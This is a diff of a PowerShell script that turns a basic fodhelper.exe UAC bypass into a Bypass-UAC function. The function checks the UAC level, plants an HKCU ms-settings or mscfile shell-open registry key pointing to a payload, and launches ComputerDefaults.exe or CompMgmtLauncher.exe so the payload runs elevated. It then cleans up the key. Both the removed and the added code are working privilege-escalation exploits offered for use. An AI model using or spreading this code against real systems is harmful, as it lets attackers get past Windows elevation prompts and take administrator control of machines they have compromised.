@@ -1,16 +1,44 @@
-#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe
+function Bypass-UAC{
+	[CmdletBinding()]
+	param([string]$payload='cmd.exe')
 
-$yourevilcommand = "C:\Windows\System32\cmd.exe"
+    #Get Windows Version
+    $ver = [System.Environment]::OSVersion.Version.Major
 
-#Adding all the reistry required with your command.
+	#Get UAC Level
+	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin
 
-New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
+	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='cmd.exe'){
+		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
+		New-Item $regPath -Force
+		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
+		Set-ItemProperty $regPath -Name "(default)" -Value $payload -Force
+		Start-Process $exploit
+		Start-Sleep -s 5
+		Remove-Item $regPath -Force -Recurse
+	}
 
-#Starts the fodhelper process to execute your command.
+	if ($uac -eq 2) {
+		$UAC_LEVEL = 'High'
+	} elseif ($uac -eq 0) {
+		$UAC_LEVEL = 'None'
+	} elseif ($uac -eq 5) {
+		$UAC_LEVEL = 'Default'
+	} else {
+		$UAC_LEVEL = 'Unknown'
+	}
 
-Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-
-#Cleaning up the mess created.
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+	if ($UAC_LEVEL -eq "High") {
+		exit
+	} elseif ($UAC_LEVEL -eq "None") {
+		Start-Process -FilePath $payload -verb runas
+	} else {
+		if ($ver -eq 10) {
+			Add-RegKey ms-settings ComputerDefaults.exe $payload
+		} else {
+			Add-RegKey mscfile CompMgmtLauncher.exe $payload
+		}
+	}
+}
+Bypass-UAC 'cmd.exe'
